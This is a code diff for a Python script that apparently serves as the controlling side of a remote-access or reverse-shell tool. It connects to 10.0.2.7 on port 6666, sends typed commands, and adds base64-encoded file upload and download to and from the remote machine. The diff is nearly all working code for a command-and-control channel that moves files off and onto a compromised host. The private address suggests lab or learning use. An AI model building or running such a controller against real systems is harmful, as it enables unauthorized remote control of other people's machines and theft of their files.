@@ -3,6 +3,7 @@
 import socket
 import ssl
 import json
+import base64
 
 HOST = "10.0.2.7"
 PORT = 6666
@@ -30,8 +31,13 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
     def write_file(path, filedata):
         with open(path, "wb") as file:
-            file.write(filedata.encode("utf-8", "ignore"))
+            file.write(base64.b64decode(filedata))
             return "[+] Download successful"
+
+
+    def read_file(path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
 
 
     def send(data):
@@ -51,13 +57,17 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         command = input(">> ")
         command = command.split(" ")
         try:
+            if command[0] == "upload":
+                file_data = read_file(command[1])
+                command.append(file_data.decode("utf-8", "ignore"))
+
             data = command_execution(command)
+
             if command[0] == "download" and "[+] Error" not in data:
                 if len(command) > 2:
                     data = write_file(command[2], data)
                 else:
                     data = write_file(command[1], data)
-
         except Exception:
             data = "[+] Error"
 
